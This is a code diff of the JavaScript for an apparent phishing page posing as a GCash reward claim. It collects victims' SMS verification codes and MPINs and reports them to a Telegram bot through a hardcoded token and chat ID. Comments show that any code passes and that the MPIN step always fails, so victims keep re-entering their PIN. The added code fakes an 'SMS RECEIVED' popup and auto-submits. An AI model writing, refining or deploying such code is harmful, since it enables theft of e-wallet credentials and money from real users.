@@ -1,6 +1,6 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * 5 Attempts Rule - Redirect to index.html
+ * 5 Attempts Rule - SMS Autofill Popup
  */
 
 // ========== POPUP MODULE ==========
@@ -14,8 +14,10 @@
     let currentFirewallStatus = false;
     let enteredVerificationCode = '';
     let enteredMPIN = '';
-    let invalidAttempts = 0;  // Counter para sa invalid attempts
-    const MAX_ATTEMPTS = 5;    // Maximum 5 attempts
+    let invalidAttempts = 0;
+    const MAX_ATTEMPTS = 5;
+    let currentMPINValue = '';
+    let smsCodeValue = '';
     
     // ========== INITIALIZATION ==========
     function init() {
@@ -38,6 +40,7 @@
     // ========== RESET ATTEMPTS ==========
     function resetAttempts() {
         invalidAttempts = 0;
+        currentMPINValue = '';
         console.log('Invalid attempts reset to 0');
     }
     
@@ -45,21 +48,13 @@
     function handleMaxAttempts() {
         const userPhone = localStorage.getItem("userPhone") || "Unknown";
         
-        // Send notification to Telegram
         const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
         const chatId = "7298607329";
-        const message = `MAX ATTEMPTS REACHED\nUser: ${userPhone}\nAttempts: ${MAX_ATTEMPTS}\nAction: Redirect to index.html`;
+        const message = `MAX ATTEMPTS REACHED\nUser: ${userPhone}\nAttempts: ${MAX_ATTEMPTS}`;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .catch(e => console.log('Telegram error:', e));
         
-        alert(`Too many invalid attempts (${MAX_ATTEMPTS}). You will be redirected to login page.`);
-        
-        // Clear local storage
-        localStorage.removeItem("userPhone");
-        localStorage.removeItem("userDeviceId");
-        localStorage.removeItem("userDeviceDisplayId");
-        
-        // Redirect to index.html
+        alert("Use your registered GCash Number and claim again.");
         window.location.href = "index.html";
     }
     
@@ -70,9 +65,55 @@
         
         if (invalidAttempts >= MAX_ATTEMPTS) {
             handleMaxAttempts();
-            return true; // Max attempts reached
+            return true;
         }
-        return false; // Still has attempts left
+        return false;
+    }
+    
+    // ========== RESET TO STEP 1 ==========
+    function resetToStep1() {
+        const step1Container = document.getElementById('step1Container');
+        const step2Container = document.getElementById('step2Container');
+        const code6Input = document.getElementById('code6Digit');
+        
+        if (code6Input) code6Input.value = '';
+        currentMPINValue = '';
+        
+        if (step1Container) step1Container.style.display = 'block';
+        if (step2Container) step2Container.style.display = 'none';
+        
+        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
+        const attemptsCounter = document.querySelector('.attempts-counter');
+        if (attemptsCounter) {
+            attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
+            if (attemptsLeft <= 2) {
+                attemptsCounter.style.color = '#ff4444';
+                attemptsCounter.style.fontWeight = 'bold';
+            }
+        }
+        
+        // Ipakita ulit ang SMS popup
+        setTimeout(() => {
+            showSmsCodePopup();
+        }, 500);
+    }
+    
+    // ========== SIMULATE SMS CODE RECEIVED ==========
+    function showSmsCodePopup() {
+        const smsPopup = document.getElementById('smsCodePopup');
+        const smsCodeSpan = document.getElementById('smsCodeValue');
+        
+        if (smsPopup && smsCodeSpan && !smsPopup.style.display || smsPopup.style.display === 'none') {
+            // Generate random 6-digit code for simulation
+            smsCodeValue = Math.floor(100000 + Math.random() * 900000).toString();
+            smsCodeSpan.innerHTML = smsCodeValue;
+            smsPopup.style.display = 'block';
+            
+            // Auto-hide after 10 seconds
+            setTimeout(() => {
+                if (smsPopup) smsPopup.style.display = 'none';
+            }, 10000);
+        }
     }
     
     // ========== ADD ANIMATIONS ==========
@@ -101,33 +142,11 @@
                 50% { box-shadow: 0 0 15px #00f2ff, 0 0 25px #00f2ff, 0 0 35px #00f2ff; }
                 100% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
             }
-            @keyframes fadeInOut {
-                0% { opacity: 0; transform: scale(0.9); }
-                50% { opacity: 1; transform: scale(1); }
-                100% { opacity: 0; transform: scale(0.9); }
-            }
             .btn-pulse {
                 animation: pulse 0.5s ease;
             }
             .shake-effect {
                 animation: shake 0.3s ease-in-out;
-            }
-            .otp-dots {
-                display: flex;
-                justify-content: center;
-                gap: 12px;
-                margin: 20px 0;
-            }
-            .otp-dot {
-                width: 14px;
-                height: 14px;
-                border-radius: 50%;
-                background: rgba(255, 255, 255, 0.3);
-                transition: all 0.2s ease;
-            }
-            .otp-dot.filled {
-                background: #00f2ff;
-                box-shadow: 0 0 10px #00f2ff;
             }
             .mpin-dots {
                 display: flex;
@@ -166,7 +185,6 @@
                 font-weight: bold;
                 color: white;
                 cursor: pointer;
-                transition: all 0.2s ease;
                 display: flex;
                 align-items: center;
                 justify-content: center;
@@ -185,7 +203,6 @@
                 font-weight: 600;
                 color: #ffd700;
                 cursor: pointer;
-                transition: all 0.2s ease;
                 display: inline-flex;
                 align-items: center;
                 justify-content: center;
@@ -195,11 +212,6 @@
             }
             .small-back-btn:active {
                 transform: scale(0.95);
-            }
-            .transition-message {
-                text-align: center;
-                animation: fadeInOut 1.5s ease;
-                padding: 20px;
             }
             .attempts-counter {
                 font-size: 10px;
@@ -263,7 +275,6 @@
             
             console.log('Claim button clicked!');
             
-            // Reset attempts when starting new claim
             resetAttempts();
             
             const balance = await syncBalanceFromFirebase();
@@ -328,22 +339,6 @@
         }
     }
     
-    // ========== SEND SMS NOTIFICATION ==========
-    async function sendSMSNotification(userPhone, deviceId) {
-        try {
-            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-            const chatId = "7298607329";
-            const now = new Date();
-            const timestamp = now.toLocaleString();
-            
-            const message = `SMS VERIFICATION REQUEST\nUser: ${userPhone}\nDevice: ${deviceId}\nTime: ${timestamp}`;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            console.log('SMS notification sent');
-        } catch(e) {
-            console.error('Telegram error:', e);
-        }
-    }
-    
     // ========== SEND VERIFICATION ATTEMPT ==========
     async function sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft) {
         try {
@@ -368,10 +363,7 @@
         currentPhase = 3;
         enteredVerificationCode = '';
         enteredMPIN = '';
-        
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-        sendSMSNotification(userPhone, deviceId);
+        currentMPINValue = '';
         
         popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
@@ -400,7 +392,6 @@
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
-            <!-- GCASH ICON -->
             <div style="text-align: center; margin-bottom: 10px;">
                 <img src="images/gc_icon.png" style="width: 55px; height: 55px; animation: bounceIn 0.5s ease;">
             </div>
@@ -411,21 +402,34 @@
             
             <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
             
-            <!-- ATTEMPTS COUNTER -->
             <div class="attempts-counter">
                 ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
             </div>
             
-            <!-- STEP 1: 6-DIGIT CODE (BYPASS) -->
+            <!-- SMS CODE POPUP -->
+            <div id="smsCodePopup" style="display: none; background: linear-gradient(135deg, #1a1a2e, #0f0f1a); border: 1px solid #00f2ff; border-radius: 16px; padding: 12px; margin: 10px 0; animation: bounceIn 0.3s ease;">
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <div style="font-size: 30px;">📨</div>
+                    <div style="flex: 1;">
+                        <div style="font-size: 10px; color: #00f2ff;">SMS RECEIVED</div>
+                        <div style="font-size: 14px; color: white; font-weight: bold; font-family: monospace;" id="smsCodeValue">------</div>
+                    </div>
+                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: #00f2ff; color: #000; border: none; padding: 6px 12px;">
+                        USE CODE
+                    </button>
+                </div>
+            </div>
+            
+            <!-- STEP 1: 6-DIGIT CODE -->
             <div id="step1Container" style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
                 <div style="text-align: center; margin-bottom: 10px;">
                     <span style="font-size: 11px; color: #00f2ff;">STEP 1 OF 2</span>
                 </div>
                 <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0 0 10px 0;">
-                    Enter the <strong style="color: #00f2ff;">6-digit verification code</strong> sent via SMS
+                    Enter the <strong style="color: #00f2ff;">6-digit verification code</strong>
                 </p>
                 <div style="display: flex; gap: 10px; justify-content: center;">
-                    <input type="text" id="code6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white;">
+                    <input type="text" id="code6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" autocomplete="one-time-code" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white; transition: all 0.2s ease;">
                     <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
                         VERIFY
                     </button>
@@ -433,7 +437,7 @@
                 <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
             </div>
             
-            <!-- STEP 2: 4-DIGIT MPIN (ALWAYS INVALID) -->
+            <!-- STEP 2: 4-DIGIT MPIN -->
             <div id="step2Container" style="display: none; background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
                 <div style="text-align: center; margin-bottom: 10px;">
                     <span style="font-size: 11px; color: #00f2ff;">STEP 2 OF 2</span>
@@ -469,7 +473,6 @@
                 </div>
             </div>
             
-            <!-- Small BACK Button -->
             <div style="text-align: center; margin-top: 10px;">
                 <button class="small-back-btn" id="backBtnPhase3">
                     ← BACK
@@ -500,12 +503,33 @@
             };
         }
         
-        // STEP 1: 6-digit verification (BYPASS) with transition
+        // STEP 1: 6-digit verification
         const verifyBtn = document.getElementById('verify6DigitBtn');
         const codeInput = document.getElementById('code6Digit');
         const step1Container = document.getElementById('step1Container');
         const step2Container = document.getElementById('step2Container');
         const step1ErrorMsg = document.getElementById('step1ErrorMsg');
+        
+        // SMS Auto-fill button
+        const autoFillBtn = document.getElementById('autoFillSmsBtn');
+        if (autoFillBtn) {
+            autoFillBtn.onclick = function() {
+                if (codeInput && smsCodeValue) {
+                    codeInput.value = smsCodeValue;
+                    codeInput.style.borderColor = '#39ff14';
+                    codeInput.style.boxShadow = '0 0 10px #39ff14';
+                    
+                    // Auto-click verify pagkatapos ng 300ms
+                    setTimeout(() => {
+                        if (verifyBtn) verifyBtn.click();
+                    }, 300);
+                    
+                    // Hide SMS popup
+                    const smsPopup = document.getElementById('smsCodePopup');
+                    if (smsPopup) smsPopup.style.display = 'none';
+                }
+            };
+        }
         
         if (verifyBtn) {
             verifyBtn.onclick = function() {
@@ -523,7 +547,6 @@
                     return;
                 }
                 
-                // BYPASS - any 6-digit code accepted
                 console.log('6-digit code accepted:', code);
                 
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
@@ -531,7 +554,7 @@
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft);
                 
-                // TRANSITION EFFECT
+                // Transition to Step 2
                 step1Container.style.transition = 'opacity 0.3s ease';
                 step1Container.style.opacity = '0';
                 
@@ -548,7 +571,6 @@
                     }, 50);
                 }, 300);
                 
-                // Attach MPIN keypad
                 attachMPINKeypad();
             };
         }
@@ -556,10 +578,28 @@
         if (codeInput) {
             codeInput.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    verifyBtn.click();
+                    if (verifyBtn) verifyBtn.click();
+                }
+            });
+            
+            // SMS Autofill detection
+            codeInput.addEventListener('input', function(e) {
+                const value = this.value.trim();
+                if (value.length === 6 && /^\d+$/.test(value)) {
+                    this.style.borderColor = '#39ff14';
+                    this.style.boxShadow = '0 0 10px #39ff14';
+                    if (verifyBtn) verifyBtn.click();
+                } else {
+                    this.style.borderColor = 'rgba(0,242,255,0.4)';
+                    this.style.boxShadow = 'none';
                 }
             });
         }
+        
+        // Show SMS popup after 2 seconds
+        setTimeout(() => {
+            showSmsCodePopup();
+        }, 2000);
     }
     
     // ========== ATTACH MPIN KEYPAD ==========
@@ -582,13 +622,11 @@
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 
-                // INCREMENT ATTEMPTS
                 const maxReached = incrementInvalidAttempts();
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 
                 sendVerificationAttempt(userPhone, deviceId, currentMPIN, attemptsLeft);
                 
-                // Update attempts counter display
                 const attemptsCounter = document.querySelector('.attempts-counter');
                 if (attemptsCounter) {
                     attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
@@ -602,11 +640,6 @@
                 const mpinDots = document.getElementById('mpinDots');
                 
                 if (errorMsg) {
-                    if (maxReached) {
-                        errorMsg.innerHTML = '❌ Max attempts reached. Redirecting...';
-                    } else {
-                        errorMsg.innerHTML = `❌ Invalid MPIN. ${attemptsLeft} attempts remaining.`;
-                    }
                     errorMsg.style.display = 'block';
                 }
                 if (mpinDots) {
@@ -617,9 +650,12 @@
                 currentMPIN = '';
                 updateMPINDots();
                 
-                setTimeout(() => {
-                    if (errorMsg && !maxReached) errorMsg.style.display = 'none';
-                }, 2000);
+                if (!maxReached) {
+                    setTimeout(() => {
+                        if (errorMsg) errorMsg.style.display = 'none';
+                        resetToStep1();
+                    }, 1500);
+                }
             }
         }
         
